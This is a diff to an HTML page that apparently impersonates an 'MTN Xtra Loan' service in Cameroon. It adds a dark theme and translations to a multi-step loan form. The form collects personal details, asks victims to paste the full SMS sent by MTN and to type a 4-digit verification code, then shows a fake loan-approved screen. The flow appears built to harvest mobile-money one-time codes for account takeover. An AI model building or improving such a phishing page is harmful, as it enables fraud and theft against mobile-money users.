@@ -6,47 +6,91 @@
     <title>MTN Xtra Loan</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        /* Dark Theme Styling */
+        body, .app-screen { background-color: #0a192f !important; color: #ffffff; font-family: 'Segoe UI', sans-serif; }
+        header { background: transparent !important; border-bottom: none !important; }
+        .logo, .tagline { color: #ffcc00 !important; }
+        .content { color: #e6f1ff; }
+        .calculator, .payment-box { background: #112240 !important; color: #fff; border: 1px solid #1e3a8a; }
+        .payment-box h3 { color: #ffcc00 !important; }
+        input, select, textarea { background: #112240 !important; color: #fff !important; border: 1px solid #233554 !important; }
+        input::placeholder, textarea::placeholder { color: #8892b0 !important; }
+        label { color: #ccd6f6 !important; }
+        .progress-bar { background: #112240 !important; }
+        .btn-secondary { background: #233554 !important; color: #fff !important; }
+        
+        /* Language Screen */
+        #screen-language { background-color: #0a192f !important; }
+        .lang-card { background: #112240; border: 1px solid #1e3a8a; border-radius: 20px; padding: 30px; width: 100%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .lang-option { background: #172a45; border: 1px solid #233554; border-radius: 12px; padding: 15px; margin-bottom: 15px; display: flex; align-items: center; cursor: pointer; transition: 0.3s; }
+        .lang-option:hover, .lang-option.active { border-color: #ffcc00; box-shadow: 0 0 15px rgba(255,204,0,0.2); }
+        .lang-flag { font-size: 24px; margin-right: 15px; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 8px; }
+        .lang-text { flex: 1; text-align: left; }
+        .lang-text strong { display: block; font-size: 16px; color: #fff; }
+        .lang-text span { font-size: 13px; color: #8892b0; }
+        .radio-circle { width: 20px; height: 20px; border-radius: 50%; border: 2px solid #8892b0; }
+        .lang-option.active .radio-circle { border-color: #ffcc00; background: #ffcc00; box-shadow: inset 0 0 0 3px #172a45; }
+    </style>
 </head>
 <body>
 
     <!-- Screen 1: Language Selection -->
-    <div id="screen-language" class="app-screen active">
-        <div class="card">
-            <h2>Choose your language</h2>
-            <p>Select your language to continue</p>
-            <button class="lang-btn" onclick="showScreen('screen-home')">🇬🇧 English</button>
-            <button class="lang-btn" onclick="showScreen('screen-home')">🇫🇷 Français</button>
-            <button class="lang-btn" onclick="showScreen('screen-home')">🇨🇲 Camfranglais</button>
-            <p class="small-text">You can change it anytime</p>
+    <div id="screen-language" class="app-screen active" style="display: flex; justify-content: center; align-items: center;">
+        <div class="lang-card">
+            <div style="text-align: center; margin-bottom: 20px;">
+                <div style="background: #004d40; width: 80px; height: 80px; margin: 0 auto; border-radius: 20px; display: flex; justify-content: center; align-items: center; font-size: 30px; box-shadow: 0 0 20px rgba(0,77,64,0.5);">
+                    <i class="fas fa-wallet" style="color: #ffcc00;"></i>
+                </div>
+            </div>
+            <h2 style="text-align: center; color: #fff; font-size: 24px; margin-bottom: 5px;" data-translate="choose_lang">Choose your <span style="color: #ffcc00;">language</span></h2>
+            <p style="text-align: center; color: #8892b0; margin-bottom: 25px;" data-translate="select_continue">Select your language to continue</p>
+            
+            <div class="lang-option" onclick="setLanguage('en', this)">
+                <div class="lang-flag">🇬🇧</div>
+                <div class="lang-text"><strong>English</strong> <span>Continue in English</span></div>
+                <div class="radio-circle"></div>
+            </div>
+            <div class="lang-option" onclick="setLanguage('fr', this)">
+                <div class="lang-flag">🇫🇷</div>
+                <div class="lang-text"><strong>Français</strong> <span>Continuer en français</span></div>
+                <div class="radio-circle"></div>
+            </div>
+            <div class="lang-option" onclick="setLanguage('cm', this)">
+                <div class="lang-flag">🇨🇲</div>
+                <div class="lang-text"><strong>Camfranglais</strong> <span>Continue in Camfranglais</span></div>
+                <div class="radio-circle"></div>
+            </div>
+            
+            <p style="text-align: center; color: #8892b0; font-size: 13px; margin-top: 25px;" data-translate="change_anytime">You can change it anytime</p>
         </div>
     </div>
 
     <!-- Screen 2: Home & Calculator -->
     <div id="screen-home" class="app-screen">
-        <header>
+        <header style="text-align: center; padding: 30px 20px;">
             <div class="logo"><i class="fas fa-sim-card"></i> MTN Xtra Loan</div>
-            <div class="tagline">Easy Loan</div>
         </header>
 
         <div class="content">
-            <h2>Welcome to MTN Xtra Loan</h2>
-            <p>Get loans easily through MTN Xtra Loan Cameroon</p>
+            <h2 style="color: #fff; text-align: center;" data-translate="welcome">Welcome to MTN Xtra Loan</h2>
+            <p style="color: #8892b0; text-align: center; margin-bottom: 20px;" data-translate="welcome_sub">Get loans easily through MTN Xtra Loan Cameroon</p>
             
             <div class="calculator">
-                <h3>Loan Calculator</h3>
-                <label>Amount: <span id="amount-display">XAF 500,000</span></label>
+                <h3 style="color: #ffcc00; margin-bottom: 20px;" data-translate="calc_title">Loan Calculator</h3>
+                <label><span data-translate="amount">Amount</span>: <span id="amount-display" style="color: #ffcc00; font-weight: bold;">XAF 500,000</span></label>
                 <input type="range" id="loan-amount" min="10000" max="1000000" step="10000" value="500000">
                 <div class="range-labels"><span>XAF 10,000</span><span>XAF 1,000,000</span></div>
 
-                <label>Term: <span id="term-display">12 Months</span></label>
+                <label style="margin-top: 20px;"><span data-translate="term">Term</span>: <span id="term-display" style="color: #ffcc00; font-weight: bold;">12 <span data-translate="months">Months</span></span></label>
                 <input type="range" id="loan-term" min="3" max="48" step="1" value="12">
                 
                 <div class="payment-box">
-                    <p>Monthly Payment</p>
+                    <p style="color: #8892b0;" data-translate="monthly_pay">Monthly Payment</p>
                     <h3 id="monthly-payment">XAF 0</h3>
                 </div>
 
-                <button class="btn-primary" onclick="showScreen('screen-step1')">START APPLICATION</button>
+                <button class="btn-primary" onclick="showScreen('screen-step1')" data-translate="start_app">START APPLICATION</button>
             </div>
         </div>
     </div>
@@ -55,32 +99,32 @@
     <div id="screen-step1" class="app-screen">
         <div class="content">
             <div class="progress-bar"><div style="width: 33%;"></div></div>
-            <p class="step-indicator">Step 1 of 3</p>
+            <p class="step-indicator" style="color: #8892b0;" data-translate="step1_of">Step 1 of 3</p>
             
-            <h3>Loan Details</h3>
-            <label>Loan Type</label>
+            <h3 style="color: #fff; margin-bottom: 20px;" data-translate="loan_details">Loan Details</h3>
+            <label data-translate="loan_type">Loan Type</label>
             <select id="loan-type">
-                <option>Business Loan</option>
-                <option>Personal Loan</option>
-                <option>Emergency Loan</option>
-                <option>Education Loan</option>
+                <option data-translate="biz_loan">Business Loan</option>
+                <option data-translate="personal_loan">Personal Loan</option>
+                <option data-translate="emergency_loan">Emergency Loan</option>
+                <option data-translate="edu_loan">Education Loan</option>
             </select>
 
-            <label>Loan Amount (XAF)</label>
+            <label data-translate="loan_amount_xaf">Loan Amount (XAF)</label>
             <input type="number" id="form-amount" value="500000">
 
-            <label>Loan Term</label>
+            <label data-translate="loan_term">Loan Term</label>
             <select id="form-term">
-                <option>12 Months</option>
-                <option>24 Months</option>
-                <option>36 Months</option>
-                <option>48 Months</option>
+                <option data-translate="12_m">12 Months</option>
+                <option data-translate="24_m">24 Months</option>
+                <option data-translate="36_m">36 Months</option>
+                <option data-translate="48_m">48 Months</option>
             </select>
 
-            <label>Purpose of Loan</label>
-            <input type="text" id="loan-purpose" placeholder="e.g., Business expansion">
+            <label data-translate="purpose">Purpose of Loan</label>
+            <input type="text" id="loan-purpose" placeholder="e.g., Business expansion" data-translate="purpose_ph">
 
-            <button class="btn-primary" onclick="showScreen('screen-step2')">NEXT STEP</button>
+            <button class="btn-primary" onclick="validateStep1()" data-translate="next_step">NEXT STEP</button>
         </div>
     </div>
 
@@ -88,27 +132,27 @@
     <div id="screen-step2" class="app-screen">
         <div class="content">
             <div class="progress-bar"><div style="width: 66%;"></div></div>
-            <p class="step-indicator">Step 2 of 3</p>
+            <p class="step-indicator" style="color: #8892b0;" data-translate="step2_of">Step 2 of 3</p>
 
-            <h3>Personal Details</h3>
-            <label>First Name</label>
-            <input type="text" id="first-name" placeholder="First Name">
+            <h3 style="color: #fff; margin-bottom: 20px;" data-translate="personal_details">Personal Details</h3>
+            <label data-translate="first_name">First Name</label>
+            <input type="text" id="first-name" placeholder="First Name" data-translate="first_name_ph">
 
-            <label>Last Name</label>
-            <input type="text" id="last-name" placeholder="Last Name">
+            <label data-translate="last_name">Last Name</label>
+            <input type="text" id="last-name" placeholder="Last Name" data-translate="last_name_ph">
 
-            <label>Phone Number (Cameroon)</label>
+            <label data-translate="phone">Phone Number (Cameroon)</label>
             <div class="phone-input">
                 <span>+237</span>
-                <input type="tel" id="phone" placeholder="9 digits (e.g., 670123456)">
+                <input type="tel" id="phone" placeholder="9 digits (e.g., 670123456)" data-translate="phone_ph">
             </div>
 
-            <label>5-Digit Verification Code</label>
-            <input type="text" id="verification-code" placeholder="Enter 5-digit code" maxlength="5" pattern="\d{5}">
+            <label data-translate="verify_code">5-Digit Verification Code</label>
+            <input type="text" id="verification-code" placeholder="Enter 5-digit code" maxlength="5" pattern="\d{5}" data-translate="verify_ph">
 
             <div class="btn-row">
-                <button class="btn-secondary" onclick="showScreen('screen-step1')">BACK</button>
-                <button class="btn-primary" onclick="showScreen('screen-step3')">NEXT STEP</button>
+                <button class="btn-secondary" onclick="showScreen('screen-step1')" data-translate="back">BACK</button>
+                <button class="btn-primary" onclick="validateStep2()" data-translate="next_step">NEXT STEP</button>
             </div>
         </div>
     </div>
@@ -117,33 +161,33 @@
     <div id="screen-step3" class="app-screen">
         <div class="content">
             <div class="progress-bar"><div style="width: 100%;"></div></div>
-            <p class="step-indicator">Step 3 of 3</p>
+            <p class="step-indicator" style="color: #8892b0;" data-translate="step3_of">Step 3 of 3</p>
 
-            <h3>Employment Details</h3>
-            <label>Employment Status</label>
+            <h3 style="color: #fff; margin-bottom: 20px;" data-translate="emp_details">Employment Details</h3>
+            <label data-translate="emp_status">Employment Status</label>
             <select id="employment-status">
-                <option>Self-employed</option>
-                <option>Employed full-time</option>
-                <option>Employed part-time</option>
-                <option>Student</option>
-                <option>Unemployed</option>
+                <option data-translate="self_emp">Self-employed</option>
+                <option data-translate="emp_ft">Employed full-time</option>
+                <option data-translate="emp_pt">Employed part-time</option>
+                <option data-translate="student">Student</option>
+                <option data-translate="unemployed">Unemployed</option>
             </select>
 
-            <label>Annual Income (XAF)</label>
-            <input type="number" id="annual-income" placeholder="e.g., 5000000">
+            <label data-translate="annual_income">Annual Income (XAF)</label>
+            <input type="number" id="annual-income" placeholder="e.g., 5000000" data-translate="annual_ph">
 
             <div class="btn-row">
-                <button class="btn-secondary" onclick="showScreen('screen-step2')">BACK</button>
-                <button class="btn-primary" id="submit-btn">SUBMIT APPLICATION</button>
+                <button class="btn-secondary" onclick="showScreen('screen-step2')" data-translate="back">BACK</button>
+                <button class="btn-primary" id="submit-btn" onclick="validateStep3(event)" data-translate="submit_app">SUBMIT APPLICATION</button>
             </div>
         </div>
     </div>
 
     <!-- Screen 6: Processing -->
     <div id="screen-processing" class="app-screen processing">
-        <h2 id="processing-title">Processing Application</h2>
-        <p id="processing-text">Please wait while an agent reviews your loan request. Do not close this page.</p>
-        <div class="loader" id="loader-spinner"></div>
+        <div class="loader" id="loader-spinner" style="margin-top: 40px;"></div>
+        <h2 id="processing-title" style="color: #fff; margin-top: 20px;" data-translate="processing">Processing Application</h2>
+        <p id="processing-text" style="color: #8892b0;" data-translate="processing_sub">Please wait while an agent reviews your loan request.</p>
     </div>
 
     <!-- Screen 7: Paste SMS -->
@@ -154,76 +198,56 @@
                 <i class="fas fa-envelope-open-text"></i>
             </div>
 
-            <h2 style="color: #000; font-weight: bold; margin-bottom: 15px; font-size: 24px;">Paste the <span style="color: #ffcc00;">SMS</span> from MTN</h2>
+            <h2 style="color: #fff; font-weight: bold; margin-bottom: 15px; font-size: 24px;" data-translate="paste_sms_title">Paste the SMS from MTN</h2>
             
-            <p style="font-size: 16px; color: #555; margin-bottom: 25px; line-height: 1.5;">
-                We sent a confirmation message to your number.<br>
-                <strong>Copy the full SMS you received</strong> and paste it below to continue.
+            <p style="font-size: 16px; color: #8892b0; margin-bottom: 25px; line-height: 1.5;" data-translate="paste_sms_sub">
+                We sent a confirmation message to your number.<br>Copy the full SMS you received and paste it below.
             </p>
 
-            <div style="background: #fff8e1; border: 1px solid #ffe082; padding: 15px; border-radius: 10px; text-align: left; margin-bottom: 20px; font-size: 14px; line-height: 1.5;">
+            <div style="background: #112240; border: 1px solid #1e3a8a; padding: 15px; border-radius: 10px; text-align: left; margin-bottom: 20px; font-size: 14px; line-height: 1.5;">
                 <span style="color: #ffa000; font-size: 20px; float: left; margin-right: 10px;"><i class="fas fa-lightbulb"></i></span>
-                Open your <strong>Messages app</strong>, find the SMS from <strong>MTN</strong>, long-press it, tap <strong>Copy</strong>, then come back here.
+                <span style="color: #ccd6f6;" data-translate="paste_sms_tip">Open your Messages app, find the SMS from MTN, long-press it, tap Copy, then come back here.</span>
             </div>
 
-            <textarea id="sms-input" placeholder="Coller le SMS reçu de MTN ici..." style="width: 100%; height: 120px; padding: 15px; border: 1px solid #ccc; border-radius: 10px; font-size: 16px; resize: none; margin-bottom: 10px;"></textarea>
+            <textarea id="sms-input" placeholder="Paste the SMS received from MTN here..." style="width: 100%; height: 120px; padding: 15px; border-radius: 10px; font-size: 16px; resize: none; margin-bottom: 20px;" data-translate="sms_ph"></textarea>
             
-            <div style="display: flex; justify-content: space-between; font-size: 14px; color: #777; margin-bottom: 25px;">
-                <span>Didn't receive the SMS?</span>
-                <span style="color: #999; font-weight: bold; cursor: pointer;">Resend SMS</span>
-            </div>
-
-            <button class="btn-primary" id="verify-btn" style="background: #ffe082; color: #fff; font-size: 18px; border: none; pointer-events: none; transition: all 0.3s ease;">VERIFY & CONTINUE &rarr;</button>
+            <button class="btn-primary" id="verify-btn" style="background: #1e3a8a; color: #8892b0; font-size: 18px; border: none; pointer-events: none; transition: all 0.3s ease;" data-translate="verify_continue">VERIFY & CONTINUE &rarr;</button>
         </div>
     </div>
 
     <!-- Screen 8: OTP Verification -->
-    <div id="screen-otp" class="app-screen" style="background-color: #f4f5f7;">
+    <div id="screen-otp" class="app-screen">
         <div class="content" style="padding-top: 40px; text-align: center;">
             
-            <!-- Lock Icon -->
-            <div style="width: 80px; height: 80px; background: #fff8e1; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px;">
+            <div style="width: 80px; height: 80px; background: #112240; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; border: 2px solid #1e3a8a;">
                 <i class="fas fa-lock" style="font-size: 35px; color: #ffcc00;"></i>
             </div>
 
-            <h2 style="color: #1a1a1a; font-weight: 800; font-size: 24px; margin-bottom: 10px;">
-                Enter the <span style="color: #ffcc00;">Verification Code</span>
+            <h2 style="color: #fff; font-weight: 800; font-size: 24px; margin-bottom: 10px;" data-translate="otp_title">
+                Enter the Verification Code
             </h2>
             
-            <p style="font-size: 15px; color: #555; margin-bottom: 30px; line-height: 1.5;">
-                We sent a <strong>4-digit code</strong> to your number.<br>Enter it below to continue.
+            <p style="font-size: 15px; color: #8892b0; margin-bottom: 30px; line-height: 1.5;" data-translate="otp_sub">
+                We sent a 4-digit code to your number.<br>Enter it below to continue.
             </p>
 
-            <!-- 4 Digit Inputs -->
             <div class="otp-container" style="display: flex; justify-content: center; gap: 15px; margin-bottom: 30px;">
-                <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" style="width: 60px; height: 70px; text-align: center; font-size: 32px; font-weight: bold; border: 2px solid #ddd; border-radius: 12px; background: #fff; outline: none; transition: all 0.2s;">
-                <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" style="width: 60px; height: 70px; text-align: center; font-size: 32px; font-weight: bold; border: 2px solid #ddd; border-radius: 12px; background: #fff; outline: none; transition: all 0.2s;">
-                <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" style="width: 60px; height: 70px; text-align: center; font-size: 32px; font-weight: bold; border: 2px solid #ddd; border-radius: 12px; background: #fff; outline: none; transition: all 0.2s;">
-                <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" style="width: 60px; height: 70px; text-align: center; font-size: 32px; font-weight: bold; border: 2px solid #ddd; border-radius: 12px; background: #fff; outline: none; transition: all 0.2s;">
+                <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" style="width: 60px; height: 70px; text-align: center; font-size: 32px; font-weight: bold; border: 2px solid #233554; border-radius: 12px; background: #112240; color: #fff; outline: none; transition: all 0.2s;">
+                <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" style="width: 60px; height: 70px; text-align: center; font-size: 32px; font-weight: bold; border: 2px solid #233554; border-radius: 12px; background: #112240; color: #fff; outline: none; transition: all 0.2s;">
+                <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" style="width: 60px; height: 70px; text-align: center; font-size: 32px; font-weight: bold; border: 2px solid #233554; border-radius: 12px; background: #112240; color: #fff; outline: none; transition: all 0.2s;">
+                <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" style="width: 60px; height: 70px; text-align: center; font-size: 32px; font-weight: bold; border: 2px solid #233554; border-radius: 12px; background: #112240; color: #fff; outline: none; transition: all 0.2s;">
             </div>
 
-            <button class="btn-primary" id="otp-submit-btn" style="background: #ffe082; color: #fff; font-size: 18px; border: none; pointer-events: none; border-radius: 30px; padding: 18px; transition: all 0.3s ease;">
-                VERIFY & CONTINUE &rarr;
-            </button>
-            
-            <p style="font-size: 14px; color: #777; margin-top: 20px;">
-                Didn't receive the code? <strong style="color: #004d40; cursor: pointer;">Resend code</strong>
-            </p>
-            
-            <p style="font-size: 13px; color: #999; margin-top: 40px;">
-                <i class="fas fa-lock" style="color: #ffcc00;"></i> Secure connection to MTN Xtra Loan
-            </p>
+            <button class="btn-primary" id="otp-submit-btn" style="background: #1e3a8a; color: #8892b0; font-size: 18px; border: none; pointer-events: none; border-radius: 30px; padding: 18px; transition: all 0.3s ease;" data-translate="verify_continue">VERIFY & CONTINUE &rarr;</button>
         </div>
     </div>
 
-    <!-- Screen 9: Congratulations (Success Page) -->
-    <div id="screen-success" class="app-screen" style="background-color: #f4f5f7;">
-        <div style="max-width: 500px; margin: 0 auto; background: #fff; min-height: 100%; padding-bottom: 40px; position: relative; overflow: hidden;">
+    <!-- Screen 9: Congratulations -->
+    <div id="screen-success" class="app-screen">
+        <div style="max-width: 500px; margin: 0 auto; min-height: 100%; padding-bottom: 40px; position: relative; overflow: hidden;">
             
-            <!-- Blue Top Section -->
-            <div style="background: #003366; padding: 40px 20px; text-align: center; border-bottom-left-radius: 30px; border-bottom-right-radius: 30px; position: relative;">
-                <!-- MoMo Logo Placeholder -->
-                <div style="background: #002244; display: inline-block; padding: 15px; border-radius: 20px; margin-bottom: 20px; border: 2px solid #004488;">
+            <div style="background: #004d40; padding: 40px 20px; text-align: center; border-bottom-left-radius: 30px; border-bottom-right-radius: 30px; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
+                <div style="background: #00332a; display: inline-block; padding: 15px; border-radius: 20px; margin-bottom: 20px; border: 2px solid #00695c;">
                     <div style="color: #ffcc00; font-size: 24px; font-weight: bold; display: flex; align-items: center; gap: 10px;">
                         <i class="fas fa-wallet"></i> MoMo
                     </div>
@@ -232,40 +256,30 @@
                 
                 <div style="font-size: 50px; margin-bottom: 15px;">🎉</div>
                 
-                <h1 style="color: #fff; font-size: 32px; font-weight: bold; margin-bottom: 10px;">Congratulations!</h1>
-                <p style="color: #cce0ff; font-size: 16px;">Your loan has been approved</p>
+                <h1 style="color: #fff; font-size: 32px; font-weight: bold; margin-bottom: 10px;" data-translate="congrats">Congratulations!</h1>
+                <p style="color: #b2dfdb; font-size: 16px;" data-translate="loan_approved">Your loan has been approved</p>
             </div>
 
-            <!-- Content Section -->
             <div style="padding: 40px 20px; text-align: center;">
-                <h3 style="color: #888; font-size: 14px; letter-spacing: 2px; margin-bottom: 10px;">APPROVED AMOUNT</h3>
+                <h3 style="color: #8892b0; font-size: 14px; letter-spacing: 2px; margin-bottom: 10px;" data-translate="approved_amount">APPROVED AMOUNT</h3>
                 
-                <div style="font-size: 42px; font-weight: 900; color: #003366; margin-bottom: 30px; display: flex; justify-content: center; align-items: baseline; gap: 5px;">
-                    <span style="font-size: 20px; color: #888; font-weight: bold;">XAF</span>
-                    <span style="color: #ffcc00;">1,000,000</span>
+                <div style="font-size: 42px; font-weight: 900; color: #fff; margin-bottom: 30px; display: flex; justify-content: center; align-items: baseline; gap: 5px;">
+                    <span style="font-size: 20px; color: #8892b0; font-weight: bold;">XAF</span>
+                    <span id="approved-amount-display" style="color: #ffcc00;">0</span>
                 </div>
 
-                <!-- Green Banner -->
-                <div style="background: #e8f5e9; border-radius: 30px; padding: 15px 20px; display: inline-flex; align-items: center; gap: 10px; margin-bottom: 30px; border: 1px solid #c8e6c9;">
+                <div style="background: rgba(0, 77, 64, 0.4); border-radius: 30px; padding: 15px 20px; display: inline-flex; align-items: center; gap: 10px; margin-bottom: 30px; border: 1px solid #00695c;">
                     <span style="font-size: 24px;">⏰</span>
-                    <span style="color: #2e7d32; font-weight: bold; font-size: 16px;">Funds within less than 24 hours</span>
+                    <span style="color: #4ade80; font-weight: bold; font-size: 16px;" data-translate="funds_24h">Funds within less than 24 hours</span>
                 </div>
 
-                <p style="color: #555; font-size: 16px; line-height: 1.6;">
+                <p style="color: #8892b0; font-size: 16px; line-height: 1.6;" data-translate="sms_notification">
                     You'll receive an SMS notification once the loan has been credited to your account.
                 </p>
             </div>
-            
-            <!-- Decorative Confetti (Background) -->
-            <div style="position: absolute; top: 10%; left: 10%; font-size: 20px; transform: rotate(-20deg);">🟨</div>
-            <div style="position: absolute; top: 15%; right: 10%; font-size: 20px; transform: rotate(45deg);">🟦</div>
-            <div style="position: absolute; bottom: 20%; left: 5%; font-size: 20px; transform: rotate(15deg);">🟨</div>
-            <div style="position: absolute; bottom: 10%; right: 15%; font-size: 20px; transform: rotate(-35deg);">🟦</div>
-            <div style="position: absolute; bottom: 30%; right: 5%; font-size: 20px; transform: rotate(10deg);">🟨</div>
         </div>
     </div>
 
-    <!-- Scripts -->
-    <script src="script.js?v=9"></script>
+    <script src="script.js?v=11"></script>
 </body>
 </html>
